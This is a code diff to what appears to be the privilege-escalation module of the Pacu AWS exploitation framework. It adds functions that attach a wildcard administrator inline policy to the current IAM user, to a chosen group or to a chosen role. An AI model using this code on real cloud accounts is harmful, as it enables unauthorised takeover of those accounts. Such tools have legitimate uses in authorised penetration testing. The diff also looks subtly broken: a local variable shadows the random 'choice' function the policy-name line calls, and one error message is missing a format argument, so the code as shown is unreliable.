@@ -1148,44 +1148,91 @@ def PutUserPolicy(pacu_main, print, input, fetch_data):
 
     client = pacu_main.get_boto3_client('iam')
 
-    policy_name = input('    Is there a specific inline policy you want to modify? Enter the name now or just press enter to enumerate a list of possible policies to choose from: ')
+    print('Trying to add an administrator policy to the current user...\n')
 
-    if not policy_name:
-        inline_user_policies = []
-        for policy in active_key.policies:
-            if 'PolicyArn' not in policy:
-                # If there is no ARN, then it is inline
-                inline_user_policies.append(policy['PolicyName'])
-
-        print('Found {} inline policy(ies) attached to the current user. Choose one below.'.format(len(inline_user_policies)))
-        for i in range(0, len(inline_user_policies)):
-            print('  [{}] {}'.format(i, inline_user_policies[i]))
-        choice = input('Choose an option: ')
-        policy_name = inline_user_policies[int(choice)]
-
-    print('Targeting policy {}. Trying to turn it into an administrator policy...'.format(policy_name))
-
+    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
     try:
         client.put_user_policy(
             UserName=active_key.user_name,
             PolicyName=policy_name,
             PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
         )
-        print('  Successfully modified policy {}! You should now have administrator permissions.\n'.format(policy_name))
+        print('  Successfully added an inline policy named {}! You should now have administrator permissions.\n'.format(policy_name))
         return True
     except Exception as error:
-        print('  Failed to modify policy {}: {}\n'.format(policy_name, error))
+        print('  Failed to add inline policy {}: {}\n'.format(policy_name, error))
         return False
-
-    return
 
 
 def PutGroupPolicy(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+    active_key = session.get_active_aws_key(pacu_main.database)
+
+    print('  Starting method PutGroupPolicy...\n')
+
+    client = pacu_main.get_boto3_client('iam')
+
+    target_group = input('    Is there a specific group to target? Enter the name now or just press enter to enumerate a list of possible groups to choose from: ')
+
+    if not target_group:
+        print('Found {} groups that the current user belongs to. Choose one below.'.format(len(active_key.groups)))
+        for i in range(0, len(active_key.groups)):
+            print('  [{}] {}'.format(i, active_key.groups[i]['GroupName']))
+        choice = int(input('Choose an option: '))
+        target_group = active_key.groups[choice]['GroupName']
+
+    print('Targeting group {}. Trying to add an administrator policy to it...'.format(target_group))
+
+    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    try:
+        client.put_group_policy(
+            GroupName=target_group,
+            PolicyName=policy_name,
+            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
+        )
+        print('  Successfully added an inline policy {} to group {}! You should now have administrator permissions.\n'.format(policy_name, target_group))
+        return True
+    except Exception as error:
+        print('  Failed to add inline policy {} to group {}: {}\n'.format(policy_name, target_group, error))
+        return False
 
 
 def PutRolePolicy(pacu_main, print, input, fetch_data):
-    return
+    session = pacu_main.get_active_session()
+    active_key = session.get_active_aws_key(pacu_main.database)
+
+    print('  Starting method PutRolePolicy...\n')
+
+    client = pacu_main.get_boto3_client('iam')
+
+    target_role = input('    Is there a specific role to target? Enter the name now or just press enter to enumerate a list of possible roles to choose from: ')
+
+    if not target_role:
+        if fetch_data(['IAM', 'Roles'], 'enum_users_roles_policies_groups', '--roles', force=True) is False:
+            print('Pre-req module not run successfully. Exiting...')
+            return
+        roles = deepcopy(session.IAM['Roles'])
+
+        print('Found {} roles. Choose one below.'.format(len(roles)))
+        for i in range(0, len(roles)):
+            print('  [{}] {}'.format(i, roles[i]['RoleName']))
+        choice = input('Choose an option: ')
+        target_role = roles[int(choice)]['RoleName']
+
+    print('Targeting role {}. Trying to add an administrator policy to it...'.format(target_role))
+
+    policy_name = ''.join(choice(string.ascii_lowercase + string.digits) for _ in range(10))
+    try:
+        client.put_role_policy(
+            RoleName=target_role,
+            PolicyName=policy_name,
+            PolicyDocument='{"Version": "2012-10-17","Statement": [{"Effect": "Allow","Action": "*","Resource": "*"}]}'
+        )
+        print('  Successfully added an inline policy {} to role {}! That role should now have administrator permissions.\n'.format(policy_name, target_role))
+        return True
+    except Exception as error:
+        print('  Failed to add inline policy {} to role {}: {}\n'.format(policy_name, target_role))
+        return False
 
 
 def AddUserToGroup(pacu_main, print, input, fetch_data):
